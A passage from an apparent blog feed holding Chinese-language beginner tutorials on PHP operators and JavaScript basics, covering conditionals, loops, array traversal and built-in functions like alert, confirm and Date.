<span class="comment">// &quot;Hello Alice&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hi&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> .= <span class="string">&quot; PHP&quot;</span>; <span class="comment">// &quot;Hi PHP&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-6-递增-递减运算符"><a href="#5-6-递增-递减运算符" class="headerlink" title="5.6 递增&#x2F;递减运算符"></a>5.6 递增&#x2F;递减运算符</h3><table><thead><tr><th align="center"><strong>运算符</strong></th><th align="center"><strong>名称</strong></th></tr></thead><tbody><tr><td align="center"><code>++$a</code></td><td align="center">前递增（先加后返回值）</td></tr><tr><td align="center"><code>$a++</code></td><td align="center">后递增（先返回值后加）</td></tr><tr><td align="center"><code>--$a</code></td><td align="center">前递减（先减后返回值）</td></tr><tr><td align="center"><code>$a--</code></td><td align="center">后递减（先返回值后减）</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$x</span>; <span class="comment">// 6（$x先变成6，再输出）</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="number">6</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>++; <span class="comment">// 6（输出6，然后$x变7）</span></span><br></pre></td></tr></table></figure><h3 id="5-7-数组运算符"><a href="#5-7-数组运算符" class="headerlink" title="5.7 数组运算符"></a>5.7 数组运算符</h3><table><thead><tr><th align="center"><strong>运算符</strong></th><th align="center"><strong>功能</strong></th></tr></thead><tbody><tr><td align="center"><code>+</code></td><td align="center">合并数组（保留第一个数组的键）</td></tr><tr><td align="center"><code>==</code></td><td align="center">键值对相同</td></tr><tr><td align="center"><code>===</code></td><td align="center">键值对相同且顺序、类型一致</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="variable">$b</span> = [<span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> + <span class="variable">$b</span>; <span class="comment">// [1, 2]（相同键名会被忽略）</span></span><br></pre></td></tr></table></figure><h3 id="5-8-错误控制运算符"><a href="#5-8-错误控制运算符" class="headerlink" title="5.8 错误控制运算符"></a>5.8 错误控制运算符</h3><p>​<code>@</code> 抑制错误：<code>@file(&#39;none.txt&#39;);</code>（不显示警告）</p><h3 id="5-9-位运算符"><a href="#5-9-位运算符" class="headerlink" title="5.9 位运算符"></a>5.9 位运算符</h3><table><thead><tr><th align="center"><strong>运算符</strong></th><th align="center"><strong>名称</strong></th></tr></thead><tbody><tr><td align="center"><code>&amp;</code></td><td align="center">按位与</td></tr><tr><td align="center"><code>|</code></td><td align="center">按位或</td></tr><tr><td align="center"><code>^</code></td><td align="center">按位异或</td></tr><tr><td align="center"><code>~</code></td><td align="center">按位取反</td></tr><tr><td align="center"><code>&lt;&lt;</code></td><td align="center">左移</td></tr><tr><td align="center"><code>&gt;&gt;</code></td><td align="center">右移</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">9</span> &amp; <span class="number">3</span>; <span class="comment">// 1（二进制 1001 &amp; 0011 = 0001）</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础（二）</title>
      <link href="/2025/05/14/JavaScript%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2025/05/14/JavaScript%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript基础（二）"><a href="#JavaScript基础（二）" class="headerlink" title="JavaScript基础（二）"></a>JavaScript基础（二）</h1><h2 id="1-JS的流程控制和函数"><a href="#1-JS的流程控制和函数" class="headerlink" title="1. JS的流程控制和函数"></a>1. JS的流程控制和函数</h2><h3 id="1-1-JS分支结构"><a href="#1-1-JS分支结构" class="headerlink" title="1.1 JS分支结构"></a>1.1 JS分支结构</h3><h4 id="1-1-1-if结构"><a href="#1-1-1-if结构" class="headerlink" title="1.1.1 if结构"></a>1.1.1 <code>if</code>结构</h4><ul><li><p>JS的<code>if</code>关于真假的判断还和上篇文章所说的一样：0，空字符串，null，undefined  都为假,除此之外都为真。</p></li><li><p><strong><code>if</code>语法的基本结构：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">// 条件1为真时执行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(条件<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="comment">// 条件2为真时执行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 所有条件都不满足时执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>代码示例解析：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> level = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(level === <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;奖励1500块&#x27;</span>);  <span class="comment">// ✔️ 条件1成立，输出此句</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(level === <span class="number">2</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;奖励1000块&#x27;</span>);  <span class="comment">// ❌ 条件2不成立</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;奖励500块&#x27;</span>);   <span class="comment">// ❌ 前两个条件都不成立时执行</span></span><br><span class="line">&#125; <span class="comment">// 执行的结果是 奖励1500块</span></span><br></pre></td></tr></table></figure></li><li><p><strong>核心规则：</strong></p><ul><li><code>if</code> 可以单独使用。</li><li><code>else if</code> 和 <code>else</code> 必须与 <code>if</code> 连用</li><li>代码会从上到下检查条件，第一个满足条件的分支会执行，后续分支直接跳过，如果所有条件都不满足，执行 <code>else</code> 分支（如果有）。</li></ul></li></ul><h4 id="1-1-2-switch结构"><a href="#1-1-2-switch结构" class="headerlink" title="1.1.2 switch结构"></a>1.1.2 <code>switch</code>结构</h4><ul><li><p><strong><code>switch</code>语法的基本结构：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)&#123;</span><br><span class="line">  <span class="keyword">case</span> 值<span class="number">1</span>:</span><br><span class="line">    <span class="comment">// 当表达式 === 值1 时执行</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 值<span class="number">2</span>:</span><br><span class="line">    <span class="comment">// 当表达式 === 值2 时执行</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="attr">default</span>:</span><br><span class="line">    <span class="comment">// 没有匹配到任何 case 时执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>代码示例解析：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="title function_">prompt</span>(<span class="string">&#x27;请输入语音提示服务编号&#x27;</span>)</span><br><span class="line">num = <span class="title class_">Number</span>(num) <span class="comment">// 用户输入的信息默认都是字符串类型，所以我们这里将字符串转化为数值型。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//switch穿透问题-必须添加break</span></span><br><span class="line"><span class="keyword">switch</span>(num)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;话费业务1&#x27;</span>) <span class="comment">// num === 1 时执行</span></span><br><span class="line">        <span class="keyword">break</span> <span class="comment">// 必须用 break 退出 switch</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;流量业务2&#x27;</span>) <span class="comment">// num === 2 时执行</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;宽带业务3&#x27;</span>) <span class="comment">// num === 3 时执行</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;国际业务4&#x27;</span>) <span class="comment">// num == 4 时执行</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;投诉建议5&#x27;</span>) <span class="comment">// num === 5 时执行</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="attr">default</span>: </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;没有该业务&#x27;</span>) <span class="comment">// num === 6 时执行   </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>核心规则：</strong></p><ul><li>严格相等比较：<code>switch</code> 会用 <code>===</code> 比较表达式和 <code>case</code> 的值，要求值和类型都相同。</li><li><code>break</code>关键字：每个 <code>case</code> 后必须写 <code>break</code>，否则代码会继续执行下一个 <code>case</code>（称为“贯穿”）。</li><li><code>default</code>分支：当所有 <code>case</code> 都不匹配时执行，类似 <code>if-else</code> 中的 <code>else</code>。</li></ul></li><li><p><code>swith</code>与<code>if-else</code>在用法上还是有一定区别的：</p></li><li><table><thead><tr><th align="center">特性</th><th align="center"><code>switch</code></th><th align="center"><code>if-else</code></th></tr></thead><tbody><tr><td align="center"><strong>比较方式</strong></td><td align="center">严格相等 (<code>===</code>)</td><td align="center">任意条件表达式</td></tr><tr><td align="center"><strong>适用场景</strong></td><td align="center">多固定值匹配</td><td align="center">范围判断或复杂条件</td></tr><tr><td align="center"><strong>可读性</strong></td><td align="center">多分支时更清晰</td><td align="center">简单分支时更直接</td></tr></tbody></table></li></ul><h3 id="1-2-JS循环结构"><a href="#1-2-JS循环结构" class="headerlink" title="1.2 JS循环结构"></a>1.2 JS循环结构</h3><h4 id="1-2-1-while循环"><a href="#1-2-1-while循环" class="headerlink" title="1.2.1 while循环"></a>1.2.1 <code>while</code>循环</h4><ul><li><p><strong><code>while</code>基本语法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(循环条件)&#123;</span><br><span class="line">    <span class="comment">// 条件为 true 时重复执行的代码（循环体）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>特点：</strong>先判断条件，再执行循环体（可能一次都不执行）。</li></ul></li><li><p><strong>代码示例解析</strong></p><ul><li><p><strong>1. 计算 1~100 的累加和</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">1</span>;      <span class="comment">// 初始化计数器</span></span><br><span class="line"><span class="keyword">let</span> sum = <span class="number">0</span>;    <span class="comment">// 初始化累加器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(i &lt;= <span class="number">100</span>)&#123;</span><br><span class="line">    sum += i;   <span class="comment">// 累加当前 i 的值</span></span><br><span class="line">    i++;        <span class="comment">// 更新计数器（避免死循环的关键）</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(sum); <span class="comment">// 输出：5050</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>逻辑：</strong>循环 100 次，每次将 <code>i</code> 的值累加到 <code>sum</code>，最终得到总和。</p><ul><li><p><strong>2. 找出 1~100 中能被 10 整除的数</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> j = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(j &lt;= <span class="number">100</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (j % <span class="number">10</span> === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(j + <span class="string">&#x27;: 能够被整除&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    j++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>输出</strong>：<br><code>10: 能够被整除</code><br><code>20: 能够被整除</code><br>…<br><code>100: 能够被整除</code></p></li></ul></li><li><p><strong>核心规则</strong></p><ul><li><strong>必须包含循环终止条件</strong><br>例如 <code>i++</code> 或 <code>j++</code>，否则会导致死循环（浏览器卡死）。</li><li><strong>循环条件为 <code>true</code> 时执行</strong><ul><li>若条件始终为 <code>true</code>，循环永不停止（需强制关闭页面）。</li><li>示例错误：若忘记写 <code>i++</code>，<code>i</code> 永远小于 100，导致死循环。</li></ul></li><li><strong>支持 <code>break</code> 和 <code>continue</code></strong><ul><li><code>break</code>：立即终止整个循环。</li><li><code>continue</code>：跳过本次循环，直接进入下一次。</li></ul></li></ul></li></ul><h4 id="1-2-2-for循环"><a href="#1-2-2-for循环" class="headerlink" title="1.2.2 for循环"></a>1.2.2 <code>for</code>循环</h4><ul><li><p><strong><code>for</code>的基本语法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(初始化; 循环条件; 迭代操作)&#123;</span><br><span class="line">    <span class="comment">// 循环体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>执行顺序：</strong>初始化 → 检查条件 → 执行循环体 → 迭代操作 → 重复检查条件。</li></ul></li><li><p><strong>代码示例解析</strong></p><ul><li><p><strong>1.基础<code>for</code>循环</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 循环10次，输出1~10</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">1</span>; i&lt;=<span class="number">10</span>; i++)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;循环次数:&#x27;</span>+i); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出：循环次数:1 ~ 循环次数:10</span></span><br></pre></td></tr></table></figure></li><li><p><strong>2.猜字谜游戏</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> successData = <span class="string">&#x27;K&#x27;</span>; <span class="comment">// 正确答案</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> j=<span class="number">1</span>; j&lt;=<span class="number">3</span>; j++)&#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="title function_">prompt</span>(<span class="string">&#x27;请输入字母A-Z（剩余机会:&#x27;</span> + (<span class="number">3</span>-j+<span class="number">1</span>) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(data === successData)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;猜对了!&#x27;</span>);</span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 立即终止循环</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;猜错了!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>break</code> 作用：匹配成功后直接跳出循环，不再执行后续机会。</li></ul></li></ul></li><li><p><strong>数组遍历方法</strong></p><p>​接下来我们要提到数组的<code>for</code>循环遍历，所以先来简单介绍一下JS的数组，它与C语言中的数组没有太大区别。</p><ul><li><p><strong>定义：</strong>数组（Array）是用于存储 <strong>有序元素集合</strong> 的数据结构。</p></li><li><p><strong>特点：</strong></p><ul><li>元素可以是任意类型（数字、字符串、对象等）。</li><li>索引从 <code>0</code> 开始（第一个元素是 <code>array[0]</code>）。</li><li>长度动态可变（无需预先定义大小）。</li></ul></li><li><p><strong>创建一个数组</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方式1：字面量直接创建</span></span><br><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">10</span>, <span class="string">&quot;apple&quot;</span>, <span class="literal">true</span>]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式2：使用构造函数</span></span><br><span class="line"><span class="keyword">let</span> arr2 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 空数组</span></span><br><span class="line"><span class="keyword">let</span> emptyArr = [];</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>基本操作</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fruits = [<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;orange&quot;</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fruits[<span class="number">0</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fruits[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">fruits[<span class="number">1</span>] = <span class="string">&quot;watermelon&quot;</span>; </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fruits);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fruits.<span class="property">length</span>);</span><br></pre></td></tr></table></figure><ul><li><p>访问元素</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fruits = [<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;orange&quot;</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fruits[<span class="number">0</span>]); <span class="comment">// 输出：&quot;apple&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fruits[<span class="number">2</span>]); <span class="comment">// 输出：&quot;orange&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>修改元素</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fruits[<span class="number">1</span>] = <span class="string">&quot;watermelon&quot;</span>; </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fruits); <span class="comment">// [&quot;apple&quot;, &quot;watermelon&quot;, &quot;orange&quot;]</span></span><br></pre></td></tr></table></figure></li><li><p>获取长度</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fruits.<span class="property">length</span>); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure></li></ul><p>在我们简单了解JS中的数组之后，接下来我们来看看JS中数组遍历的方法。</p></li><li><p><strong>传统<code>for</code>循环</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array1 = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">50</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;array1.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(array1[i]); <span class="comment">// 输出每个元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>for...in</code> 循环（遍历索引）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> index <span class="keyword">in</span> array1)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(array1[index]); <span class="comment">// 输出索引对应元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>for...of</code> 循环（遍历元素）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> item <span class="keyword">of</span> array1) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(item); <span class="comment">// 直接输出元素值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>forEach</code> 高阶函数</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array2 = [<span class="string">&quot;小明&quot;</span>,<span class="string">&quot;小红&quot;</span>,<span class="string">&quot;小王&quot;</span>,<span class="string">&quot;小李&quot;</span>,<span class="string">&quot;小赵&quot;</span>]</span><br><span class="line">array2.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">item, index</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(index + <span class="string">&quot;||&quot;</span> + item); </span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 输出示例：0||小明  1||小红 ...</span></span><br></pre></td></tr></table></figure></li><li><p><strong>遍历方式对比</strong></p></li><li><table><thead><tr><th align="center">遍历方式</th><th align="center">特点</th><th align="center">适用场景</th></tr></thead><tbody><tr><td align="center"><code>for</code></td><td align="center">精确控制索引，可修改原数组</td><td align="center">需要索引操作的遍历</td></tr><tr><td align="center"><code>for...in</code></td><td align="center">遍历索引（含继承属性，需谨慎）</td><td align="center">对象属性遍历更常见</td></tr><tr><td align="center"><code>for...of</code></td><td align="center">直接获取元素，简洁高效</td><td align="center">仅需元素值的数组遍历</td></tr><tr><td align="center"><code>forEach</code></td><td align="center">函数式编程风格，不可中断</td><td align="center">简单遍历且无需中断时</td></tr></tbody></table></li></ul></li></ul><h3 id="1-3-JS函数"><a href="#1-3-JS函数" class="headerlink" title="1.3 JS函数"></a>1.3 JS函数</h3><h4 id="1-3-1-内置函数"><a href="#1-3-1-内置函数" class="headerlink" title="1.3.1 内置函数"></a>1.3.1 内置函数</h4><ul><li><p>在JS中可以不需要对象调用,可以直接使用的函数</p></li><li><p>常见分类</p></li><li><p><strong>1. 弹框类函数</strong></p><ul><li><p><code>alert()</code></p><ul><li><p><strong>作用：</strong>弹出警告框，显示指定消息，需用户手动关闭。</p></li><li><p><strong>特点：</strong>阻塞后续代码执行，直到用户点击“确定”。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;我是弹出框&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>confirm()</code></p><ul><li><p><strong>作用：</strong>弹出确认框，显示消息并提供“确定”和“取消”选项。</p></li><li><p><strong>返回值：</strong>用户点击“确定”返回 <code>true</code>，点击“取消”返回 <code>false</code>。</p></li><li><p><strong>使用场景：</strong>常用于删除、退出等操作的二次确认。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> flag = <span class="title function_">confirm</span>(<span class="string">&#x27;你确定删除数据吗?&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(flag); <span class="comment">// 输出 true 或 false</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><strong>2. 控制台输出</strong></p><ul><li><p><code>console.log()</code></p><ul><li><p><strong>作用：</strong>在浏览器控制台输出信息，用于调试。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;123132123123&quot;</span>); <span class="comment">// 控制台显示字符串</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(date); <span class="comment">// 输出变量值（如日期对象）</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><strong>3. 时间处理</strong></p><ul><li><p><code>Date</code>对象</p><ul><li><p><strong>作用：</strong>创建日期对象，用于获取或操作时间。</p></li><li><p><strong>初始化：</strong><code>new Date()</code>获取当前时间。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(date); <span class="comment">// 输出：Thu Jun 06 2024 12:34:56 GMT+0800</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><strong>4. 全局对象</strong></p><ul><li><p><code>this</code>关键字</p></li><li><p><strong>全局作用域中：</strong>指向全局对象。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">print</span>(); <span class="comment">// 等同于 window.print()</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>5. 页面打印</strong></p><ul><li><p><code>print()</code></p><ul><li><p><strong>作用：</strong>调起浏览器打印对话框，打印当前页面内容。</p></li><li><p><strong>注意：</strong>部分浏览器可能限制自动调用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">print</span>(); <span class="comment">// 等同于 window.print()</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><strong>6. 其他注意事项</strong></p><ul><li><strong>内置函数与宿主环境</strong><ul><li><code>alert()</code>, <code>confirm()</code>, <code>print()</code> 属于 BOM（浏览器对象模型），由浏览器提供，非 ECMAScript 